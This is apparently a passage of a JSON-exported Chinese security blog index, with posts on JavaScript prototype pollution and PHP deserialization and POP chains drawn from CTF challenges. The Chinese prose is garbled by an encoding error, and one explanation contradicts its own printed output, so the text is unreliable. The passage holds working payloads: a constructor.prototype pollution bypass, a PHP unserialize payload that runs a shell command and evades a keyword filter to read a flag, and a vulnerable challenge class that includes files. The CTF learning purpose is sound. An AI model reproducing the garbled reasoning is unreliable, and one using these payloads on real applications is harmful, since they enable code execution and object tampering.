å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª `constructor` å±æ€§ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒæŒ‡å‘åˆ›å»ºè¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚\n\n- ä¾‹å¦‚ï¼š\n\n  ```javascript\n  const obj = {};\n  console.log(obj.constructor === Object); // true\n  ```\n\n##### **`prototype` çš„ä½œç”¨**\n\n- æ„é€ å‡½æ•°çš„ `prototype` å±æ€§æ˜¯å®ä¾‹å¯¹è±¡çš„é»˜è®¤åŸå‹ï¼ˆå³å®ä¾‹çš„ `__proto__`ï¼‰ã€‚\n\n- ä¾‹å¦‚ï¼š\n\n  ```javascript\n  function MyClass() {}\n  const obj = new MyClass();\n  console.log(obj.__proto__ === MyClass.prototype); // true\n  ```\n\n##### **ä¸¤è€…çš„å…³ç³»**\n\n- ä¿®æ”¹æ„é€ å‡½æ•°çš„ `prototype` ä¼šå½±å“ç”±è¯¥æ„é€ å‡½æ•°åˆ›å»ºçš„æ‰€æœ‰å¯¹è±¡çš„åŸå‹ã€‚\n- é€šè¿‡ `constructor.prototype` å¯ä»¥é—´æ¥ä¿®æ”¹å¯¹è±¡çš„åŸå‹é“¾ï¼Œç”šè‡³æ˜¯å…¨å±€å¯¹è±¡çš„åŸå‹ã€‚\n\næ‰€ä»¥ï¼Œå½“æˆ‘ä»¬çš„_\\_proto__è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨constructor.prototypeç»•è¿‡\n\n```\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key == \"__proto__\") {\n            continue;\n        }\n        if (key in target && key in source) {\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]\n        }\n    }\n}\n\nlet payload = JSON.parse('{\"constructor\": {\"prototype\": {\"polluted\": \"Yes, I am polluted!\"}}}');\n\nlet user={}\nmerge(user, payload);\n\n// éªŒè¯\nconsole.log({}.polluted); // \"Yes, I am polluted!\"\n```\n\n##### Functionæ¦‚å¿µ\n\næ¯ä¸€ä¸ªjavascriptçš„functionå®é™…ä¸Šéƒ½æ˜¯Functionå¯¹è±¡ï¼ŒFunctionæ˜¯javascriptå†…ç½®çš„å¯¹è±¡ï¼ŒFunctionç”¨ä»¥å®ç°å¾ˆå¤šåŸºæœ¬çš„åŠŸèƒ½ï¼Œå¦‚Numberã€toStringç­‰ã€‚\n\n```\n (function () {}).constructor\n //Function() { [native code] }\n (function () {}).constructor === Function\n //true\n```\n\n###### Function() constructor \n\nFunction()æ„é€ å™¨å¯ä»¥åˆ›å»ºä¸€ä¸ªFunctionå¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨Function()æ„é€ å™¨åŠ¨æ€çš„åˆ›å»ºå‡½æ•°ã€‚ä½†æ˜¯ä¼šå­˜åœ¨åƒeval()çš„å®‰å…¨éšæ‚£å’Œä¸€äº›æ€§èƒ½é—®é¢˜ã€‚\n\neval()å’ŒFunctionåŒºåˆ«:\n\n1ã€eval()å¯ä»¥è®¿é—®æœ¬åœ°çš„å˜é‡ã€å…¨å±€å˜é‡\n\n2ã€Funtion()åˆ›å»ºå‡½æ•°æ—¶åªèƒ½æ‰§è¡Œå…¨å±€å˜é‡\n\n![image-20241116203304251](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318206.png)\n\n![image-20241116204011412](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318959.png)\n\n### JSON.parse\n\nçœ‹ä¸€ä¸ªç»å…¸çš„é€’å½’åˆå¹¶å‡½æ•°\n\n```javascript\nfunction merge(target,source) {\n\tfor (let key in source) {\n\t\tif (key in source && key in target) {\n\t\t\tmerge(target[key],source[key])\n\t\t}else{\n\t\t\ttarget[key]=source[key]\n\t\t}\n\t}\n}\n\nlet o1={}\nlet o2={a: 1,\"__proto__\": {b:2}}\nmerge(o1,o2)\nconsole.log(o1.b)\n\no3={}\nconsole.log(o3.b)\n[Running] node \"payload.js\"\n2\nundefined\n[Done] exited with code=0 in 0.199 seconds\n```\n\næ ¸å¿ƒæ€æƒ³æ˜¯ç†è§£ `__proto__` åœ¨å¯¹è±¡å®šä¹‰ä¸­çš„è¡Œä¸ºï¼Œä»¥åŠå®ƒåœ¨åˆå¹¶æ“ä½œä¸­å¦‚ä½•å½±å“ç›®æ ‡å¯¹è±¡ã€‚ä»¥ä¸‹æ˜¯é€æ­¥è§£é‡Šï¼š\n\n#### 1. **`__proto__` çš„è¡Œä¸º**\n\nåœ¨ JavaScript ä¸­ï¼Œ`__proto__` æ˜¯ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼Œç”¨äºè®¾ç½®å¯¹è±¡çš„åŸå‹ã€‚å®ƒä¸æ˜¯æ™®é€šçš„é”®ï¼Œè€Œæ˜¯ä¸å¯¹è±¡çš„åŸå‹é“¾ç›¸å…³ã€‚\n\n##### å½“ `__proto__` è¢«ç”¨ä½œé”®ï¼š\n\n```javascript\nlet o2 = {a: 1, \"__proto__\": {b: 2}};\n```\n\n- åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ`__proto__` è¡¨é¢ä¸Šçœ‹æ˜¯ä¸€ä¸ªæ™®é€šçš„é”®å€¼å¯¹ã€‚\n- **å®é™…è¡Œä¸º**ï¼š`__proto__` è¿™ä¸ªé”®ä¼šè¢«ç‰¹æ®Šå¤„ç†ï¼Œå°† `{b: 2}` ä½œä¸º `o2` çš„åŸå‹ï¼Œè€Œä¸æ˜¯æ™®é€šçš„å¯¹è±¡å±æ€§ã€‚\n\nç›¸å½“äºï¼š\n\n```javascript\no2.a = 1;\no2.__proto__ = {b: 2}; // o2 ç»§æ‰¿äº† {b: 2} ä½œä¸ºå®ƒçš„åŸå‹ã€‚\n```\n\nç»“æœï¼š\n\n- `o2.a` æ˜¯ o2 è‡ªå·±çš„å±æ€§ã€‚\n- `o2.b` ä¸ç›´æ¥å­˜åœ¨äº o2ï¼Œè€Œæ˜¯æ¥è‡ªäºå®ƒçš„åŸå‹ `{b: 2}`ã€‚\n\nå¦‚æœç›´æ¥è®¿é—® `o2.b`ï¼ŒJavaScript ä¼šé€šè¿‡åŸå‹é“¾æŸ¥æ‰¾ï¼Œå› æ­¤ `o2.b` çš„å€¼æ˜¯ `2`ã€‚\n\n#### 2. **åˆå¹¶å‡½æ•°çš„è¡Œä¸º**\n\næˆ‘ä»¬æ¥çœ‹ `merge` å‡½æ•°ï¼š\n\n```javascript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key in source && key in target) {\n            merge(target[key], source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n}\n```\n\n- **`for...in` å¾ªç¯**ï¼š\n  éå† `source` çš„æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼ŒåŒ…æ‹¬ç»§æ‰¿çš„å±æ€§ï¼ˆä»åŸå‹é“¾ä¸Šæ¥çš„ï¼‰ã€‚\n- **`key in source` åˆ¤æ–­**ï¼š ç¡®ä¿ `key` æ˜¯ `source` ä¸­çš„ä¸€ä¸ªå±æ€§ï¼ˆåŒ…æ‹¬è‡ªèº«å’ŒåŸå‹é“¾ï¼‰ã€‚\n\n#### 3. **ä¸ºä»€ä¹ˆåªæœ‰ `a` è¢«åˆå¹¶ï¼Ÿ**\n\nå½“ä½ æ‰§è¡Œï¼š\n\n```javascript\nlet o1 = {};\nlet o2 = {a: 1, \"__proto__\": {b: 2}};\nmerge(o1, o2);\nconsole.log(o1.b); // undefined\n```\n\n#### å…³é”®ç‚¹ï¼š\n\n- **`for...in` ä¸ä¼šç›´æ¥æšä¸¾ `__proto__` ä½œä¸ºæ™®é€šé”®ã€‚**\n- `o2` åªæœ‰ä¸€ä¸ªç›´æ¥å±æ€§ `a`ï¼Œå› æ­¤ `merge` å‡½æ•°ä¸­åªä¼šå¤„ç† `a`ã€‚\n- `__proto__` è¢«ç”¨ä½œåŸå‹è®¾ç½®ï¼Œ`{b: 2}` æˆä¸ºäº† `o2` çš„åŸå‹ã€‚\n\nå› æ­¤ï¼š\n\n- **`o1` åˆå¹¶ç»“æœ**ï¼š`o1.a = 1`ã€‚\n- **`o1.b` æ˜¯ undefined**ï¼šå› ä¸º `b` æ˜¯ `o2` çš„åŸå‹å±æ€§ï¼Œè€Œ `merge` å‡½æ•°ä¸ä¼šé€’å½’æˆ–å¤åˆ¶åŸå‹é“¾çš„å±æ€§ã€‚\n\n#### 4. **ä¸ºä»€ä¹ˆ `o1.b = 2` è¿™å¥è¯ä¸æˆç«‹ï¼Ÿ**\n\nåˆå¹¶åï¼Œ`o1` å¹¶æ²¡æœ‰ `b`ï¼Œå› ä¸ºï¼š\n\n- `b` å¹¶ä¸æ˜¯ `o2` è‡ªèº«çš„å±æ€§ï¼Œè€Œæ˜¯å…¶åŸå‹çš„å±æ€§ã€‚\n- `merge` å‡½æ•°åªå¤„ç†ç›´æ¥å±æ€§ï¼Œæœªå¤åˆ¶ `b` åˆ° `o1`ã€‚\n\n**æ€»ç»“ï¼š** `__proto__` åœ¨å¯¹è±¡å­—é¢é‡ä¸­ä¼šè¢«è§£é‡Šä¸ºè®¾ç½®åŸå‹ï¼Œè€Œä¸æ˜¯æ™®é€šé”®å€¼å¯¹ã€‚æ‰€ä»¥ï¼Œ`merge` åªä¼šå¤„ç† `o2` çš„ç›´æ¥å±æ€§ï¼ˆ`a`ï¼‰ï¼Œä¸ä¼šå¤„ç†é€šè¿‡åŸå‹é“¾ç»§æ‰¿çš„ `b`ï¼Œå› æ­¤ `o1.b` ä»ç„¶æ˜¯ `undefined`ã€‚\n\n#### 5.ä¸ºä»€ä¹ˆè¿è¡Œç»“æœç¡®æ˜¯2\n\nè¿è¡Œç»“æœæ¥çœ‹ï¼Œ`console.log(o1.b)` è¿”å›äº† `2`ï¼Œè¿™è¡¨æ˜åœ¨æŸç§ç¨‹åº¦ä¸Šç¡®å®è¯»å–åˆ°äº†å±æ€§ `b`ï¼Œè€Œè¿™æ˜¯ä» `__proto__` åŸå‹é“¾ç»§æ‰¿çš„å±æ€§ã€‚æˆ‘ä»¬é‡æ–°åˆ†æä»¥ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼Œå¸®åŠ©ç†è§£ä¸ºä»€ä¹ˆä¼šå‘ç”Ÿè¿™ç§ç°è±¡ï¼š\n\n#### 5.1. **`__proto__` åœ¨å¯¹è±¡å­—é¢é‡ä¸­çš„ä½œç”¨**\n\nå½“ä½ å®šä¹‰ï¼š\n\n```javascript\nlet o2 = { a: 1, \"__proto__\": { b: 2 } };\n```\n\n`o2` çš„ç»“æ„å˜æˆï¼š\n\n```javascript\no2 = {\n  a: 1,\n  __proto__: { b: 2 }\n};\n```\n\nè¿™æ„å‘³ç€ `o2` çš„åŸå‹è¢«è®¾ç½®ä¸º `{ b: 2 }`ï¼Œå³ `o2` é€šè¿‡åŸå‹é“¾å¯ä»¥è®¿é—® `b`ã€‚\n\n#### 5.2. **`merge` å‡½æ•°å¦‚ä½•å·¥ä½œ**\n\n```javascript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key in source && key in target) {\n            merge(target[key], source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n}\n```\n\n- **`for...in` çš„è¡Œä¸º**ï¼š `for...in` ä¼šè¿­ä»£ `source` çš„**å¯æšä¸¾å±æ€§**ï¼ŒåŒ…æ‹¬ç»§æ‰¿è‡ªåŸå‹çš„å±æ€§ã€‚\n\nåœ¨è¿™ä¸ªæƒ…å†µä¸‹ï¼š\n\n- `o2` çš„ç›´æ¥å±æ€§æ˜¯ `a`ã€‚\n- `o2` é€šè¿‡åŸå‹é“¾ç»§æ‰¿äº†å±æ€§ `b`ï¼Œä¸” `b` æ˜¯å¯æšä¸¾çš„ã€‚\n\n#### 5.3. **æ‰§è¡Œè¿‡ç¨‹**\n\nå½“ `merge(o1, o2)` æ‰§è¡Œæ—¶ï¼š\n\n- `key = \"a\"`ï¼šå°† `o2.a` çš„å€¼ `1` åˆå¹¶åˆ° `o1`ã€‚\n- `key = \"b\"`ï¼šç”±äº `b` æ˜¯ä» `__proto__` ç»§æ‰¿çš„ï¼Œå®ƒä¹Ÿè¢« `for...in` è¿­ä»£åˆ°ï¼Œå› æ­¤ `o2.b` çš„å€¼ `2` è¢«èµ‹å€¼åˆ° `o1.b`ã€‚\n\næœ€ç»ˆï¼Œ`o1` çš„å†…å®¹æ˜¯ï¼š\n\n```javascript\no1 = {\n  a: 1,\n  b: 2\n};\n```\n\n#### 5.4. **ä¸ºä»€ä¹ˆ `console.log(o1.b)` è¾“å‡º `2`ï¼Ÿ**\n\nå½“ `merge` å‡½æ•°è¿è¡Œå®Œåï¼Œ`o1` å¯¹è±¡è¢«èµ‹äºˆäº†ä¸€ä¸ªæ–°å±æ€§ `b`ï¼Œå…¶å€¼ä¸º `2`ã€‚å› æ­¤ï¼Œå½“ä½ æ‰§è¡Œï¼š\n\n```javascript\nconsole.log(o1.b); // è¾“å‡º 2\n```\n\nè¿™æ­£æ˜¯ç”±äº `b` è¢«ç›´æ¥åˆå¹¶åˆ° `o1` çš„åŸå› ã€‚\n\n#### 6. **è¿™æ˜¯å¦ç®—åŸå‹æ±¡æŸ“ï¼Ÿ**\n\n**ä¸ç®—çœŸæ­£çš„åŸå‹æ±¡æŸ“**ï¼ŒåŸå› å¦‚ä¸‹ï¼š\n\n- **æ±¡æŸ“çš„å®šä¹‰**ï¼šåŸå‹æ±¡æŸ“æ„å‘³ç€ä¿®æ”¹äº†åŸå‹å¯¹è±¡ï¼ˆå¦‚ `Object.prototype`ï¼‰ï¼Œå¯¼è‡´æ‰€æœ‰å¯¹è±¡éƒ½å—åˆ°å½±å“ã€‚\n- ä½ çš„æ“ä½œä»…ä»…æ˜¯åœ¨ `o1` ä¸Šè®¾ç½®äº†ä¸€ä¸ªæ™®é€šå±æ€§ `b`ï¼Œå¹¶æ²¡æœ‰ä¿®æ”¹å…¨å±€åŸå‹é“¾ã€‚å› æ­¤ï¼Œå…¶ä»–å¯¹è±¡ï¼ˆå¦‚ `{}`ï¼‰å¹¶ä¸ä¼šå—åˆ°å½±å“ã€‚\n\n#### 7. **éªŒè¯æ˜¯å¦æ±¡æŸ“äº†å…¨å±€åŸå‹**\n\nä½ å¯ä»¥éªŒè¯ï¼š\n\n```javascript\nconsole.log({}.b); // å¦‚æœæ˜¯åŸå‹æ±¡æŸ“ï¼Œä¼šè¾“å‡º 2ï¼Œä½†æ˜¯è¾“å‡ºçš„æ˜¯undefined\n```\n\nè‹¥ç»“æœä¸º `undefined`ï¼Œè¯´æ˜æ²¡æœ‰æ±¡æŸ“å…¨å±€åŸå‹ã€‚\n\n#### ç»“è®º\n\nä½ å½“å‰çš„ `merge` æ“ä½œä»…ä»…æ˜¯å°† `b` åˆå¹¶åˆ°äº† `o1` å¯¹è±¡ä¸Šï¼Œæ²¡æœ‰å¯¼è‡´åŸå‹æ±¡æŸ“ã€‚ **è¦å®ç°åŸå‹æ±¡æŸ“ï¼Œéœ€è¦æ˜ç¡®æ“ä½œå…¨å±€åŸå‹é“¾ï¼ˆä¾‹å¦‚é€šè¿‡ä¿®æ”¹ `Object.prototype`ï¼‰**ã€‚\n\n#### å¥½ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¨€å½’æ­£ä¼ ï¼Œå¦‚ä½•æ‰èƒ½çœŸæ­£æ±¡æŸ“å‘¢ï¼Ÿ\n\nä¸»è§’ç™»åœº--è¯·çœ‹ä¸‹é¢ä»£ç \n\n```javascript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key in source && key in target) {\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]\n        }\n    }\n}\nlet o1 = {}\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\n//æ³¨æ„let o2 = {\"a\": 1, \"proto\": {\"b\": 2}}è¿™ç§å†™æ³•å’Œlet o2 = {a: 1, \"__proto__\": {b: 2}}å†™æ³•ç»“æœæ˜¯ä¸€æ ·çš„\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n \no3 = {}\nconsole.log(o3.b)\n\n[Running] node \"d:\\web\\æ±¡æŸ“\\PCB-notadmin\\payload.js\"\n1 2\n2\n\n[Done] exited with code=0 in 2.918 seconds\n```\n\n#### 1. **`JSON.parse` å’Œ `__proto__` çš„ä½œç”¨**\n\nåœ¨ `JSON.parse` ä¸­ï¼Œ`{\"__proto__\": {\"b\": 2}}` ä¼šè¢«è§£æä¸ºï¼š\n\n```javascript\n{\n  a: 1,\n  __proto__: { b: 2 }\n}\n```\n\næ­¤æ—¶ï¼Œ`o2` çš„ `__proto__` å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ™®é€šå±æ€§ï¼Œè€Œä¸æ˜¯åŸå‹é“¾ã€‚\n\nä½†æ˜¯ï¼Œå½“ `merge` å‡½æ•°æ‰§è¡Œä»¥ä¸‹è¯­å¥æ—¶ï¼š\n\n```javascript\ntarget[key] = source[key];\n```\n\né‚£ä¹ˆå¦‚æœ `key` æ˜¯ `__proto__`ï¼Œå®ƒä¼šè§¦å‘ **åŸå‹é“¾ä¿®æ”¹**ï¼Œè¿™æ ·å°±ç›¸å½“äºç»™æœ€é¡¶å±‚çš„Object.prototypeæ‰€æŒ‡å‘çš„å¯¹è±¡æ·»åŠ äº†å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬éšä¾¿åˆ›å»ºä¸€ä¸ªå¯¹è±¡ä¹Ÿå°±æœ‰äº†bè¿™ä¸ªå±æ€§ ã€‚\n\n#### 2. **åŸå‹æ±¡æŸ“çš„å‘ç”Ÿ**\n\nåœ¨ `merge(o1, o2)` ä¸­ï¼š\n\n- `key = \"a\"`ï¼š`o1.a = 1`ï¼Œæ— é—®é¢˜ã€‚\n- `key = \"__proto__\"`ï¼š`o1[\"__proto__\"] = { b: 2 }`ã€‚\n\nå½“è®¾ç½® `o1[\"__proto__\"] = { b: 2 }` æ—¶ï¼Œå®é™…ä¸Šä¿®æ”¹äº† `o1` çš„åŸå‹é“¾ï¼Œä½¿ `o1` å’Œæ‰€æœ‰ç»§æ‰¿è‡ª `Object.prototype` çš„å¯¹è±¡ï¼ˆåŒ…æ‹¬ `o3`ï¼‰çš„åŸå‹è¢«æ±¡æŸ“ã€‚\n\nå› æ­¤ï¼š\n\n- `o1.b` ç­‰äº `2`ï¼Œå› ä¸º `b` æ¥è‡ªäºè¢«æ±¡æŸ“çš„åŸå‹ã€‚\n- `o3.b` ä¹Ÿç­‰äº `2`ï¼Œå³ä½¿ `o3` æœ¬èº«æ²¡æœ‰ `b`ï¼Œå®ƒä»ç„¶ä»å…¨å±€çš„ `Object.prototype` ç»§æ‰¿äº†æ±¡æŸ“ã€‚\n\n#### 3. **éªŒè¯æ±¡æŸ“**\n\nå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼éªŒè¯æ±¡æŸ“ï¼š\n\n```javascript\nconsole.log({}.b); // è¾“å‡º 2ï¼Œè¯´æ˜ Object.prototype è¢«æ±¡æŸ“\n```\n\nè¿™å°±æ˜¯JSåŸå‹é“¾æ±¡æŸ“åŸºç¡€äº†ã€‚\n\n\n\n[jsåŸå‹é“¾æ±¡æŸ“(è¶…è¯¦ç»†)](https://blog.csdn.net/qq_51586883/article/details/119867720)\n\n[æœåŠ¡ç«¯åŸå‹é“¾æ±¡æŸ“æ¼æ´](https://carsaid.github.io/burpsuite-learn/wsa/advanced/prototype-pollution/server-side/)","tags":["-NodeJs -pollution"]},{"title":"PHPååºåˆ—åŒ–&SESSIONååºåˆ—åŒ–","url":"/2024/07/16/PHPååºåˆ—åŒ–-SESSIONååºåˆ—åŒ–/","content":"\n# PHPååºåˆ—åŒ–&SESSIONååºåˆ—åŒ–\n\n## PHPååºåˆ—åŒ–åŸºæœ¬æ¦‚å¿µ\n\nphpåºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡ï¼Œè¿›è¡Œå˜æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯ä¸€ä¸ªä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿ä¼ è¾“æ•°æ®ï¼Œé‚£ååºåˆ—åŒ–ï¼Œå°±æ˜¯æŠŠå®ƒç¿»è¿‡æ¥ï¼Œä»ä¸€ä¸ªä¸ªé”®å€¼å¯¹å†è½¬æ¢æˆä¸€ä¸ªå¯¹è±¡ã€‚\n\n### ç¤ºä¾‹\n\n```php\n<?php\nclass test{\n    public $name='ooo';\n    public $age=18;\n}\n$t=new test();\necho serialize($t);\n?>\n    \nè¾“å‡ºï¼š  \nO:4:\"test\":2:{s:4:\"name\";s:3:\"ooo\";s:3:\"age\";i:18;}\n\nè§£é‡Šï¼š\nO:4:\"test\":2;ï¼šè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆObjectï¼‰ï¼Œç±»åæ˜¯testï¼Œç±»åé•¿åº¦ä¸º4ï¼ŒåŒ…å«2ä¸ªå±æ€§ã€‚\ns:4:\"name\";s:3:\"ooo\";ï¼šç¬¬ä¸€ä¸ªå±æ€§æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼ˆStringï¼‰ï¼Œå±æ€§åä¸ºnameï¼Œé•¿åº¦ä¸º4ï¼Œå¯¹åº”çš„å€¼ä¸ºå­—ç¬¦ä¸²oooï¼Œé•¿åº¦ä¸º3ã€‚\ns:3:\"age\";i:18;ï¼šç¬¬äºŒä¸ªå±æ€§ä¹Ÿæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼ˆStringï¼‰ï¼Œå±æ€§åä¸ºageï¼Œé•¿åº¦ä¸º3ï¼Œå¯¹åº”çš„å€¼ä¸ºæ•´æ•°ï¼ˆIntegerï¼‰18ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼Œè¿™æ®µä»£ç è¡¨ç¤ºä¸€ä¸ªç±»åä¸ºtestçš„å¯¹è±¡ï¼Œå®ƒæœ‰ä¸¤ä¸ªå±æ€§ï¼šnameï¼ˆå€¼ä¸º\"ooo\"ï¼‰å’Œageï¼ˆå€¼ä¸º18ï¼‰ã€‚\n```\n\n## [PHPååºåˆ—åŒ–çš„å‡ ä¸ªå¿…çŸ¥é­”æœ¯æ–¹æ³•](https://zhuanlan.zhihu.com/p/377676274)\n\n```php\n__construct()ï¼Œç±»çš„æ„é€ å‡½æ•°,åœ¨åˆ›é€ ä¸€ä¸ªå¯¹è±¡æ—¶å€™ï¼Œé¦–å…ˆä¼šå»æ‰§è¡Œçš„ä¸€ä¸ªæ–¹æ³•ã€‚ä½†æ˜¯åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹æ˜¯ä¸ä¼šè§¦å‘çš„ã€‚\n\n__destruct()ï¼Œç±»çš„ææ„å‡½æ•°,åœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œçš„é­”æœ¯æ–¹æ³•ã€‚\n\n__call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶,__call() ä¼šè¢«è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ è°ƒç”¨äº†ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå°±ä¼šè§¦å‘ã€‚\n\n__callStatic()ï¼Œåœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__callStatic() ä¼šè¢«è°ƒç”¨ã€‚\n\n__get()ï¼Œè¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨ã€‚__geté­”æœ¯æ–¹æ³•éœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä»£è¡¨ç€è®¿é—®ä¸å­˜åœ¨çš„å±æ€§å€¼ã€‚\n\n__set()ï¼Œç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è°ƒç”¨ã€‚\n\n__isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨,è¯¥é­”æœ¯æ–¹æ³•ä½¿ç”¨äº†isset()æˆ–è€…empty()åªè¦å±æ€§æ˜¯privateæˆ–è€…ä¸å­˜åœ¨çš„éƒ½ä¼šè§¦å‘ã€‚\n\n__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚å¦‚æœä¸€ä¸ªç±»å®šä¹‰äº†é­”æœ¯æ–¹æ³• __unset() ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ unset() å‡½æ•°æ¥é”€æ¯ç±»çš„ç§æœ‰çš„å±æ€§ï¼Œæˆ–åœ¨é”€æ¯ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶å¾—åˆ°é€šçŸ¥ã€‚\n\n__sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°\n\n__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°\n\n__toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•\n\n__invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•\n\n__set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚\n\n__clone()ï¼Œå½“ä½¿ç”¨ clone å…³é”®å­—æ‹·è´å®Œæˆä¸€ä¸ªå¯¹è±¡åï¼Œæ–°å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³• __clone() ï¼Œå¦‚æœè¯¥é­”æœ¯æ–¹æ³•å­˜åœ¨çš„è¯ã€‚\n\n__autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»\n\n__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯\n\n```\n\n### å°è¯•ç‰›åˆ€-----[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ\n\n```php\n <?php\nhighlight_file(__FILE__);\n// Maybe you need learn some knowledge about deserialize?\nclass evil {\n    private $cmd;\n\n    public function __destruct()\n    {\n        if(!preg_match(\"/cat|tac|more|tail|base/i\", $this->cmd)){\n            @system($this->cmd);\n        }\n    }\n}\n\n@unserialize($_POST['unser']);\n?> \n\npayload:\nPOST:unser=O:4:\"evil\":1:{s:3:\"cmd\";s:35:\"sort /th1s_1s_fffflllll4444aaaggggg\";}\n```\n\n## PHPçš„POPé“¾\n\næŒ‰æˆ‘è‡ªå·±çš„ç†è§£ï¼ŒPHPçš„popé“¾å°±æ˜¯é€šè¿‡æ”¹å˜å¯¹è±¡çš„å±æ€§ï¼Œæ”¹å˜å¯¹è±¡çš„å…ƒç´ çš„å±æ€§ï¼Œå»è§¦å‘ç›¸åº”çš„é­”æœ¯æ–¹æ³•ï¼Œæ¥è¿›è¡Œä¸€ä¸ªé“¾å¼ååº”ï¼Œä»¥æ­¤æ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚\n\n### ç¤ºä¾‹(è§¦å‘tostringæ–¹æ³•ï¼Œè¿›è¡Œé“¾å¼ååº”)\n\n```php\n<?php\nclass a{\n    public $x;\n    public $y;\n    public function __destruct(){\n        echo $this->x;\n    }\n}\nclass b{\n    public $o;\n    public function __tostring(){\n        echo \"111\";\n        return \"flag{this_is_flag}\";\n    }\n}\n\n$a1 = new a();\n$b1 = new b();\n$a1->x=new b();\n$s=serialize($a1);\n?>\n\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\n\n111flag{this_is_flag}\nProcess finished with exit code 0\n//è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„é“¾å¼ååº”\n```\n\n### å°è¯•ç‰›åˆ€-----[MRCTF2020]Ezpop\n\n```php\n <?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\n    protected  $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\n\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this->source = $file;\n        echo 'Welcome to 